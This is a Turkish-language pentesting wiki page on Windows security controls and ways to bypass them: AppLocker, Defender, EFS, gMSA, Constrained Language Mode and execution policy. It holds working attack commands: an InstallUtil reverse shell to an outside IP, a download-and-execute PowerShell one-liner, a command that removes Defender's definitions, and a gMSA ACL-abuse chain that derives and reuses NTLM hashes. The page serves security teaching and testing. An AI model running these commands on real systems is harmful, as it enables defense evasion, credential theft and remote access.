# Windows Security Controls

{{#include ../../banners/hacktricks-training.md}}

## AppLocker İlkesi

Bir application whitelist, bir sistemde bulunmasına ve çalıştırılmasına izin verilen onaylı software applications veya executable'ların listesidir. Amaç, ortamı zararlı malware'lerden ve bir kuruluşun belirli business ihtiyaçlarıyla uyumlu olmayan onaysız software'lerden korumaktır.

[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker), Microsoft'un **application whitelisting solution**'ıdır ve system administrator'lara **kullanıcıların hangi applications ve files'ları çalıştırabileceği** üzerinde kontrol sağlar. Executable'lar, scripts, Windows installer files, DLL'ler, packaged apps ve packed app installers üzerinde **ayrıntılı kontrol** sunar.\
Kuruluşların **cmd.exe ve PowerShell.exe'yi** ve belirli dizinlere yazma erişimini **engellemesi yaygındır**, **ancak bunların tümü bypass edilebilir**.

### Kontrol

Hangi files/extensions'ların blacklisted/whitelisted olduğunu kontrol edin:
```bash
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```
This registry path contains the configurations and policies applied by AppLocker, providing a way to review the current set of rules enforced on the system:

- `HKLM\Software\Policies\Microsoft\Windows\SrpV2`

### Bypass

- AppLocker Policy'yi bypass etmek için kullanışlı **yazılabilir klasörler**: AppLocker `C:\Windows\System32` veya `C:\Windows` içindeki herhangi bir şeyin çalıştırılmasına izin veriyorsa, **bunu bypass etmek** için kullanabileceğiniz **yazılabilir klasörler** vardır.
```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```
- Genellikle **güvenilir** [**"LOLBAS"**](https://lolbas-project.github.io/) binary'leri AppLocker'ı bypass etmek için de kullanılabilir.
- **Kötü yazılmış kurallar da bypass edilebilir**
- Örneğin, **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`** için herhangi bir yerde **`allowed` adlı bir klasör** oluşturabilirsiniz; bu klasöre izin verilir.
- Kuruluşlar ayrıca genellikle **`%System32%\WindowsPowerShell\v1.0\powershell.exe` executable'ını engellemeye** odaklanır, ancak `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` veya `PowerShell_ISE.exe` gibi diğer [**PowerShell executable konumlarını**](https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations) gözden kaçırır.
- **DLL enforcement**, bir sisteme ek yük getirebilmesi ve hiçbir şeyin bozulmayacağından emin olmak için gereken test miktarı nedeniyle çok nadiren etkinleştirilir. Bu nedenle **DLL'leri backdoor olarak kullanmak AppLocker'ı bypass etmeye yardımcı olur**.
- Herhangi bir process içinde **Powershell** kodu çalıştırmak ve AppLocker'ı bypass etmek için [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) veya [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) kullanabilirsiniz. Daha fazla bilgi için: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).<sup>[[4]](#references)</sup>

## Kimlik Bilgilerinin Depolanması

### Security Accounts Manager (SAM)

Yerel kimlik bilgileri bu dosyada bulunur; parolalar hash'lenmiştir.

### Local Security Authority (LSA) - LSASS

**Single Sign-On** nedenleriyle **kimlik bilgileri** (hash'lenmiş olarak) bu alt sistemin **belleğine** **kaydedilir**.\
**LSA**, yerel **güvenlik politikasını** (parola politikası, kullanıcı izinleri...), **authentication**'ı, **access token**'larını vb. yönetir.\
LSA, **SAM** dosyasındaki sağlanan kimlik bilgilerini (yerel giriş için) **kontrol eden** ve bir domain kullanıcısını authenticate etmek için **domain controller** ile **iletişim kuran** bileşendir.

**Kimlik bilgileri** **LSASS process'i** içinde **kaydedilir**: Kerberos ticket'ları, NT ve LM hash'leri, kolayca decrypt edilebilen parolalar.

### LSA secrets

LSA bazı kimlik bilgilerini diske kaydedebilir:

- Active Directory'deki computer account'un parolası (ulaşılamayan domain controller).
- Windows service account'larının parolaları
- Scheduled task'lar için parolalar
- Daha fazlası (IIS uygulamalarının parolası...)

### NTDS.dit

Active Directory'nin veritabanıdır. Yalnızca Domain Controller'larda bulunur.

## Defender

[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft_Defender), Windows 10 ve Windows 11'de ve Windows Server sürümlerinde bulunan bir Antivirus'tür. **`WinPEAS`** gibi yaygın pentesting araçlarını **engeller**. Ancak bu **korumaları bypass etmenin yolları** vardır.

### Check

**Defender**'ın **durumunu** kontrol etmek için PS cmdlet'i **`Get-MpComputerStatus`** çalıştırabilirsiniz (aktif olup olmadığını öğrenmek için **`RealTimeProtectionEnabled`** değerini kontrol edin):

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :
</code></pre>

Bunu enumerate etmek için şunu da çalıştırabilirsiniz:
```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```
## Encrypted File System (EFS)

EFS, **File Encryption Key (FEK)** olarak bilinen bir **simetrik anahtar** kullanarak dosyaları şifreler. Bu anahtar, kullanıcının **public key** anahtarıyla şifrelenir ve şifrelenmiş dosyanın $EFS **alternative data stream** içinde saklanır. Şifre çözme gerektiğinde, kullanıcının dijital sertifikasına karşılık gelen **private key** anahtarı, $EFS stream içindeki FEK'in şifresini çözmek için kullanılır. Daha fazla ayrıntıya [buradan](https://en.wikipedia.org/wiki/Encrypting_File_System) ulaşabilirsiniz.

**Kullanıcı tarafından başlatılmadan gerçekleşen şifre çözme senaryoları** şunları içerir:

- Dosyalar veya klasörler [FAT32](https://en.wikipedia.org/wiki/File_Allocation_Table) gibi EFS olmayan bir dosya sistemine taşındığında otomatik olarak şifreleri çözülür.
- SMB/CIFS protokolü üzerinden ağ üzerinden gönderilen şifrelenmiş dosyaların, iletimden önce şifreleri çözülür.

Bu şifreleme yöntemi, dosya sahibi için şifrelenmiş dosyalara **şeffaf erişim** sağlar. Ancak yalnızca sahibin parolasını değiştirmek ve oturum açmak, şifre çözmeye izin vermez.

**Temel Çıkarımlar**:

- EFS, kullanıcının public key anahtarıyla şifrelenmiş simetrik bir FEK kullanır.
- Şifre çözme işleminde, FEK'e erişmek için kullanıcının private key anahtarı kullanılır.
- FAT32'ye kopyalama veya ağ üzerinden iletim gibi belirli koşullarda otomatik şifre çözme gerçekleşir.
- Şifrelenmiş dosyalara, ek adımlar olmadan sahibi tarafından erişilebilir.

### EFS bilgilerini kontrol etme

Bir **user**'ın bu **service**'i **kullanıp kullanmadığını**, şu yolun mevcut olup olmadığını kontrol ederek öğrenin:`C:\users\<username>\appdata\roaming\Microsoft\Protect`

Dosyaya **kimlerin** **erişimi** olduğunu cipher /c \<file>\ kullanarak kontrol edin\
Bir klasörün içinde `cipher /e` ve `cipher /d` kullanarak tüm dosyaları **şifreleyebilir** ve **şifrelerini çözebilirsiniz**

### EFS dosyalarının şifresini çözme

#### Authority System Olmak

Bu yöntem, **victim user**'ın host içinde bir **process** **çalıştırıyor** olmasını gerektirir. Durum buysa, bir `meterpreter` session kullanarak kullanıcının process'inin token'ını (`incognito` içindeki `impersonate_token`) taklit edebilirsiniz. Alternatif olarak kullanıcının process'ine `migrate` edebilirsiniz.

#### Kullanıcının parolasını bilmek

Mimikatz, kullanıcının certificate/private key materyalini içe aktarmayı ve parola biliniyorsa EFS-korumalı dosyaların şifrelerini çözmeyi açıklar.<sup>[[6]](#references)</sup>

## Group Managed Service Accounts (gMSA)

Microsoft, BT altyapılarındaki service account'ların yönetimini kolaylaştırmak için **Group Managed Service Accounts (gMSA)** geliştirdi. Genellikle "**Password never expire**" ayarı etkin olan geleneksel service account'ların aksine, gMSA'ler daha güvenli ve yönetilebilir bir çözüm sunar:

- **Automatic Password Management**: gMSA'ler, domain veya computer policy'ye göre otomatik olarak değişen, 240 karakterlik karmaşık bir parola kullanır. Bu işlem Microsoft'un Key Distribution Service (KDC) tarafından gerçekleştirilir ve manuel parola güncellemeleri gereksinimini ortadan kaldırır.
- **Enhanced Security**: Bu account'lar lockout'lara karşı bağışıktır ve interactive login için kullanılamaz; bu da güvenliklerini artırır.
- **Multiple Host Support**: gMSA'ler birden fazla host arasında paylaşılabilir; bu nedenle birden fazla server üzerinde çalışan service'ler için idealdir.
- **Scheduled Task Capability**: managed service account'ların aksine gMSA'ler scheduled task çalıştırmayı destekler.
- **Simplified SPN Management**: Computer'ın sAMaccount ayrıntılarında veya DNS name'inde değişiklik olduğunda sistem Service Principal Name (SPN)'i otomatik olarak günceller ve SPN yönetimini kolaylaştırır.

gMSA'lerin parolaları LDAP property'si olan _**msDS-ManagedPassword**_ içinde saklanır ve Domain Controller'lar (DC'ler) tarafından her 30 günde bir otomatik olarak sıfırlanır. [MSDS-MANAGEDPASSWORD_BLOB](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e) olarak bilinen bu şifrelenmiş data blob, yalnızca yetkili administrator'lar ve gMSA'lerin kurulu olduğu server'lar tarafından alınabilir; bu da güvenli bir ortam sağlar. Bu bilgiye erişmek için LDAPS gibi güvenli bir connection gereklidir veya connection 'Sealing & Secure' ile authenticate edilmelidir.

![gMSA parolasını almak için NTLM authentication'ını relay etme](../../images/asd1.png)<sup>[[1]](#references)</sup>

Bu parolayı [**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)**:** ile okuyabilirsiniz.<sup>[[2]](#references)</sup>
```
/GMSAPasswordReader --AccountName jkohler
```
[**Arşivlenmiş orijinal araştırmada daha fazla bilgi bulunabilir**](https://web.archive.org/web/20200724233424/https://cube0x0.github.io/Relaying-for-gMSA/).<sup>[[1]](#references)</sup>

Aynı araştırma, relay edilen principal `msDS-ManagedPassword` okuma yetkisine sahip olduğunda bir **NTLM relay attack** kullanılarak nasıl **gMSA password** elde edilebileceğini açıklar.<sup>[[1]](#references)</sup>

### gMSA managed password okumak için ACL chaining abuse (GenericAll -> ReadGMSAPassword)

Birçok ortamda, düşük ayrıcalıklı kullanıcılar yanlış yapılandırılmış object ACL'lerini abuse ederek DC compromise olmadan gMSA secrets elde edebilir:<sup>[[3]](#references)</sup>

- Kontrol edebildiğiniz bir gruba (ör. GenericAll/GenericWrite aracılığıyla) bir gMSA üzerinde `ReadGMSAPassword` yetkisi verilir.
- Kendinizi bu gruba ekleyerek gMSA'nın `msDS-ManagedPassword` blob'unu LDAP üzerinden okuma ve kullanılabilir NTLM credentials türetme hakkını elde edersiniz.

Tipik workflow:

1) BloodHound ile path'i keşfedin ve foothold principal'larınızı Owned olarak işaretleyin. Şuna benzer edge'leri arayın:
- GroupA GenericAll -> GroupB; GroupB ReadGMSAPassword -> gMSA

2) Kontrol ettiğiniz intermediate group'a kendinizi ekleyin (bloodyAD ile örnek):
```bash
bloodyAD --host <DC.FQDN> -d <domain> -u <user> -p <pass> add groupMember <GroupWithReadGmsa> <user>
```
3) gMSA yönetilen parolasını LDAP üzerinden okuyun ve NTLM hash'ini türetin. NetExec, `msDS-ManagedPassword` özniteliğinin çıkarılmasını ve NTLM'e dönüştürülmesini otomatikleştirir:
```bash
# Shows PrincipalsAllowedToReadPassword and computes NTLM automatically
netexec ldap <DC.FQDN> -u <user> -p <pass> --gmsa
# Account: mgtsvc$  NTLM: edac7f05cded0b410232b7466ec47d6f
```
4) NTLM hash kullanarak gMSA olarak authenticate olun (plaintext gerekmez). Hesap Remote Management Users grubundaysa WinRM doğrudan çalışır:
```bash
# SMB / WinRM as the gMSA using the NT hash
netexec smb   <DC.FQDN> -u 'mgtsvc$' -H <NTLM>
netexec winrm <DC.FQDN> -u 'mgtsvc$' -H <NTLM>
```
Notlar:
- `msDS-ManagedPassword` için LDAP okumaları sealing (ör. LDAPS/sign+seal) gerektirir. Tools bunu otomatik olarak gerçekleştirir.
- gMSA'lere genellikle WinRM gibi yerel haklar verilir; lateral movement planlamak için grup üyeliğini (ör. Remote Management Users) doğrulayın.
- Blob'a yalnızca NTLM'yi kendiniz hesaplamak için ihtiyacınız varsa MSDS-MANAGEDPASSWORD_BLOB yapısına bakın.



## LAPS

[Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899) üzerinden indirilebilen **Local Administrator Password Solution (LAPS)**, yerel Administrator parolalarının yönetilmesini sağlar. **Randomized**, benzersiz ve **düzenli olarak değiştirilen** bu parolalar, Active Directory'de merkezi olarak saklanır. Bu parolalara erişim, ACL'ler aracılığıyla yetkili kullanıcılarla sınırlandırılır. Yeterli izinler verildiğinde yerel admin parolalarını okuma olanağı sağlanır.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

## PS Constrained Language Mode

PowerShell [**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/), PowerShell'i etkili bir şekilde kullanmak için gereken özelliklerin çoğunu **kısıtlar**; COM nesnelerini engeller, yalnızca onaylanmış .NET türlerine izin verir, XAML tabanlı iş akışlarını, PowerShell sınıflarını ve daha fazlasını kısıtlar.

### **Kontrol Et**
```bash
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```
### Bypass
```bash
#Easy bypass
Powershell -version 2
```
Güncel Windows sürümlerinde bu bypass artık çalışmıyor, ancak [**PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM) kullanabilirsiniz.\
**Derlemek için** **Referans Eklemeniz** -> _Browse_ -> _Browse_ -> `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` eklemeniz ve **projeyi .Net4.5 olarak değiştirmeniz** gerekebilir.

#### Doğrudan bypass:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```
#### Reverse shell:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```
[**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) veya [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) kullanarak herhangi bir process içinde **Powershell** kodu **çalıştırabilir** ve constrained mode'u atlayabilirsiniz. Daha fazla bilgi için: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).<sup>[[4]](#references)</sup>

## PS Execution Policy

Varsayılan olarak **restricted** olarak ayarlanmıştır. Bu policy'yi atlamanın başlıca yolları:
```bash
1º Just copy and paste inside the interactive PS console
2º Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3º Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4º Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5º Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6º Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7º Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8º Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9º Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```
Daha fazlasını [burada](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)<sup>[[5]](#references)</sup> bulabilirsiniz.

## Security Support Provider Interface (SSPI)

Kullanıcıların kimlik doğrulamasında kullanılabilen API'dir.

SSPI, iletişim kuran iki makine için uygun bir kimlik doğrulama protokolü seçer ve kullanılabilir olduğunda Kerberos'u tercih eder. Bu protokoller, Windows'a DLL olarak yüklenen Security Support Provider (SSP)'lar tarafından uygulanır; her iki eş de üzerinde anlaşmaya varılan sağlayıcıyı desteklemelidir.

### Ana SSP'ler

- **Kerberos**: Tercih edilen
- %windir%\Windows\System32\kerberos.dll
- **NTLMv1** ve **NTLMv2**: Uyumluluk nedenleriyle
- %windir%\Windows\System32\msv1_0.dll
- **Digest**: Web sunucuları ve LDAP, parola MD5 hash biçiminde
- %windir%\Windows\System32\Wdigest.dll
- **Schannel**: SSL ve TLS
- %windir%\Windows\System32\Schannel.dll
- **Negotiate**: Kullanılacak protokolü (Kerberos veya NTLM; varsayılan Kerberos'dur) belirlemek için kullanılır
- %windir%\Windows\System32\lsasrv.dll

#### Anlaşma birkaç yöntem veya yalnızca bir yöntem sunabilir.

## UAC - Kullanıcı Hesabı Denetimi

[Kullanıcı Hesabı Denetimi (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works), **yükseltilmiş işlemler için onay istemi** sağlayan bir özelliktir.


{{#ref}}
uac-user-account-control.md
{{#endref}}

## References

- [1] [gMSA için Relaying – cube0x0 (Internet Archive)](https://web.archive.org/web/20200724233424/https://cube0x0.github.io/Relaying-for-gMSA/)
- [2] [GMSAPasswordReader](https://github.com/rvazarkar/GMSAPasswordReader)
- [3] [HTB Sendai – 0xdf: rights chaining ile WinRM üzerinden gMSA](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)
- [4] [darthsidious – AppLocker ve PowerShell Constrained Language Mode'u Bypass Etme](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode)
- [5] [NetSPI – PowerShell Execution Policy'yi Bypass Etmenin 15 Yolu](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)
- [6] [howto ~ EFS dosyalarının şifresini çözme](https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files)
{{#include ../../banners/hacktricks-training.md}}
